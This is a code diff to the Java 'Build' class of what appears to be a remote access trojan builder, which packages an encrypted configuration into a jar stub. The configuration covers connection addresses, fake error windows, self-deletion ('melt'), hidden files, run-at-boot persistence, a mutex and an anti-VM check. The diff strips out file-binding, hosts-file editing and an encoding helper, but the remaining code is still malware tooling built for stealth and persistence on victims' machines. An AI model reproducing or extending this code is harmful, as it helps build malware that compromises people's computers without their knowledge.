@@ -39,7 +39,7 @@ public class Build {
 	}
 
 	@SuppressWarnings("resource")
-	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, boolean dontInstall, int droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean runNextBoot, boolean hiddenFile, boolean bind, String bindpath, String bindname, int droptarget, boolean mutex, int mutexport, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean debugmsg, OSConfig osconfig, boolean summary, boolean antivm) {
+	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, boolean dontInstall, int droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean runNextBoot, boolean hiddenFile, boolean mutex, int mutexport, boolean timeout, int timeoutms, boolean delay, int delayms, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean persistance, int persistancems, boolean summary, boolean antivm) {
 		listener.start();
 		
 		if (!file.getName().toLowerCase().endsWith(".jar")) {
@@ -122,13 +122,10 @@ public class Build {
 				config.put("name", name);
 				config.put("mutex", mutex);
 				config.put("mport", mutexport);
-				config.put("os", OSConfig.generateString(osconfig));
 				config.put("timeout", timeout);
 				config.put("toms", timeoutms);
-				config.put("error", handleerr);
 				config.put("per", persistance);
 				config.put("perms", persistancems);
-				config.put("debugmsg", debugmsg);
 				config.put("vm", antivm);
 				config.put("ti", trayicon);
 				config.put("droppath", droppath);
@@ -141,21 +138,6 @@ public class Build {
 				config.put("delayms", delayms);
 				config.put("hiddenfile", hiddenFile);
 				config.put("runnextboot", runNextBoot);
-				
-				if (bind) {
-					File bindFile = new File(bindpath);
-
-					String extension = bindFile.getName().substring(bindFile.getName().lastIndexOf("."), bindFile.getName().length());
-
-					config.put("droptarget", droptarget);
-					config.put("bindname", bindname);
-					config.put("extension", extension);
-				}
-
-
-				if (edithost) {
-					config.put("overwritehost", overwritehost);
-				}
 				
 				if (trayicon) {
 					config.put("tititle", "");
@@ -191,54 +173,15 @@ public class Build {
 				
 				outputStub.closeEntry();
 			} catch (Exception ex) {
-				if (ex instanceof ZipException && ex.getMessage().contains("duplicate entry")) {
-					listener.reportProgress(30, "Skipped config.dat, already exists.", BuildStatus.ERROR);
-				} else {
-					throw ex;
-				}
-			}
-			
-			if (edithost) {
-				Cipher cipher = CryptoUtils.getBlockCipher(Cipher.ENCRYPT_MODE, secretKey, iv);
-				ByteArrayOutputStream baos = new ByteArrayOutputStream();
-				CipherOutputStream cios = new CipherOutputStream(baos, cipher);
-				BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(cios));
-				writer.write(hosttext);
-				writer.close();
-				
-				entry = new ZipEntry("host.dat");
-				outputStub.putNextEntry(entry);
-				outputStub.write(baos.toByteArray());
-				outputStub.closeEntry();
-			}
+                if (ex instanceof ZipException && ex.getMessage().contains("duplicate entry")) {
+                    listener.reportProgress(30, "Skipped config.dat, already exists.", BuildStatus.ERROR);
+                } else {
+                    throw ex;
+                }
+            }
 
 			listener.reportProgress(75, "Wrote key and data", BuildStatus.CHECK);
 
-			if (bind) {
-				File bindFile = new File(bindpath);
-				String extension = bindFile.getName().substring(bindFile.getName().lastIndexOf("."), bindFile.getName().length());
-
-				entry = new ZipEntry(bindname + extension);
-				outputStub.putNextEntry(entry);
-		
-				ByteArrayOutputStream baos = new ByteArrayOutputStream();
-				Cipher cipher = CryptoUtils.getBlockCipher(Cipher.ENCRYPT_MODE, secretKey, iv);
-				CipherOutputStream cios = new CipherOutputStream(baos, cipher);
-
-				FileInputStream fis = new FileInputStream(bindpath);
-				copy(fis, cios);
-				cios.close();
-				
-				outputStub.write(baos.toByteArray());
-				outputStub.closeEntry();
-				
-				fis.close();				
-				cios.close();
-
-				listener.reportProgress(90, "Writing file to bind... (" + bindFile.length() + " bytes)", BuildStatus.INFO);
-
-				listener.reportProgress(90, "Wrote file to bind", BuildStatus.CHECK);
-			}
 			inputStub.close();
 
 			if (trayicon) {
@@ -291,15 +234,4 @@ public class Build {
 			ex1.printStackTrace();
 		}
 	}
-
-	public static byte[] encode(String s) throws Exception {
-		s = Hex.encode(s);
-		s = Base64.encode(s);
-		return s.getBytes("UTF-8");
-	}
-
-	public static byte[] encodeLine(Object obj) throws Exception {
-		return (new String(encode(obj.toString())) + ",").getBytes("UTF-8");
-	}
-
 }
